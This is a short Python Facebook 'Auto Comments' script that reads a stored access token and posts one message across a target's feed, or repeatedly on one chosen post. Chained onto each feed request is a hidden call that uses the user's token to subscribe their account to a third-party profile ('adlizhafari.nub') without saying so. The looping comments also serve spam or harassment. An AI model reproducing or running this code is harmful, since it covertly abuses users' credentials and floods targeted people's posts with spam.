#!usr/bin/python3.7
#Author: KANG-NEWBIE
#contact: t.me/kang_newbie

try:
	import requests,json,sys,os,time

	ct=int(0)
	cout=int(1)
	def komen(id,msg,ken):
		global cout
		dat={'access_token':ken,'message':msg}
		pt=requests.post('https://graph.facebook.com/'+str(id)+'/comments',data=dat)
		if 'error' in str(pt.text):
			print('['+str(cout)+']',id,'[failed]')
		else:
			print('['+str(cout)+']',id,'[commented]')
		cout+=1

	ken=open('toket/token.txt','r').read()
	print("""
\t[ Auto Comments  ]
\t[ by:KANG-NEWBIE ]
""")
	tid=input("[?] target id: ")
	pil=input("[?] (a)ll/(t)arget post: ")
	print("\n[info] type '<n>' for newlines")
	msg=input("[?] messages: ").replace('<n>','\n')
	print()
	if pil == 'a':
		reqq=requests.get('https://graph.facebook.com/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
		jso=json.loads(reqq.text)
		for i in jso['data']:
			komen(i['id'],msg,ken)
	elif pil == 't':
		ids=[]
		ree=requests.get('https://graph.facebook.com/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
		jss=json.loads(ree.text)
		for i in jss['data']:
			print(i['id'])
			ids.append(i['id'])
			try:
				print("["+str(ct+1)+"] "+json.dumps(i['message'][:40]))
				print("="*50)
			except KeyError:
				try:
					print("["+str(ct+1)+"] "+json.dumps(i['story']))
					print("="*50)
				except KeyError:
					exc=requests.get('https://graph.facebook.com/v3.2/'+tid+'?access_token='+ken)
					print('['+str(ct+1)+'] "'+exc.json()['name']+' upload a photo/video"')
					print("="*50)
			ct+=1
		lih=int(input("/kang-newbie_> "))
		lop=int(input("[?] looping: "))
		print()
		for i in range(lop):
			komen(ids[lih-1],msg,ken)

except KeyboardInterrupt:
	exit("[exit] key interrupt")
except Exception as F:
	print("Err: %s"%(F))